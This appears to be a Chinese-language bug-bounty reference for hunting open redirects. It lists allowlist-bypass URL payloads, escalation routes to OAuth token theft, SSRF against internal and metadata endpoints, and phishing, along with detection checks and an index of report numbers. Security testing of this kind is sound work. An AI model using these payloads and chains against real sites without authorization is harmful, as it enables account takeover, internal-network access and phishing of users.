# hunt-open-redirect · 参考

真实报告源自本仓库第二轮高价值案例（value_score≥8）。`<marker>` 换成你自控的标记域，只跳它证明可控。

## 白名单绕过写法（Bypasses）

设期望域 `target.com`，攻击域 `<marker>`：
```
//<marker>                      /\<marker>                \/\<marker>
https://<marker>                https:/<marker>
https://target.com@<marker>     （@ 前是 userinfo，真正主机是 marker）
https://target.com.<marker>     （后缀绕过：以 target.com 开头的子域）
https://<marker>#target.com     https://<marker>?target.com
https://<marker>\.target.com    https://<marker>%2f%2e%2e
target.com.<marker>             ﹒/／等同形/全角点与斜杠
%2f%2f<marker>  %5c%5c<marker>  \/\/<marker>   （编码/反斜杠）
javascript:...  data:...        （若跳转直接进 href/协议无限制）
```
- 反斜杠/特殊 ASCII 使解析器与校验不一致（#1032610）。
- `#hashfragment` 里带 token 的跳转（#265943）。
- HTTP 走私 / 301 组合（#955170）。
- 头部型：`X-Accel-Redirect` 触发内部重定向（#1027873）。

## 危害升级（价值所在）

- **OAuth token 窃取**：把开放重定向喂进 `redirect_uri`/`response_mode=fragment`，token 随跳转落到 marker（#878779 URL 解码+开放重定向→SSRF；配合 hunt-auth-bypass #1567186）。
- **SSRF 跳板**：服务端跟随重定向 → 开放重定向把内部请求导向内网/元数据（#228377、#894170、#894174，配合 hunt-ssrf）。
- **Referer/token 泄露**：跳转页把敏感 token 放在 URL，Referer 带到 marker（#1327742 referer 跨域泄露 token）。
- **钓鱼**：可信域跳到仿冒页。

## Detection Patterns（怎么判，而非猜）

- **Location 头**：响应 `Location:` 指向 `<marker>`（含各种绕过写法解析后仍是 marker）= 命中。别只看字符串包含 target，要看**最终主机**是不是 marker。
- **前端跳转**：响应体里 `window.location`/`meta refresh`/`<a href>` 指向 marker。
- **跟随后落点**：`curl -I` 不跟随看 Location；或 `curl -L` 看最终 URL 主机。
- **升级验证**：跳转是否携带 token/code（看 marker 侧是否收到）。

## Real Reports（复现索引）

| 手法/升级 | 报告 |
|---|---|
| 反斜杠/特殊 ASCII 绕过 | 1032610 |
| →SSRF（Full read） | 878779 / 228377 |
| →2FA/SSRF 链 | 894170 / 894174 |
| Referer token 泄露 | 1327742 |
| hash fragment token | 265943 |
| X-Accel-Redirect | 1027873 |
| 走私+301 | 955170 |

hunt 顺序：先 `//marker`、`https://target@marker`、后缀 `target.marker` 三板斧 → 命中后看 Location 最终主机 → 评估能否喂 OAuth/SSRF 升级。
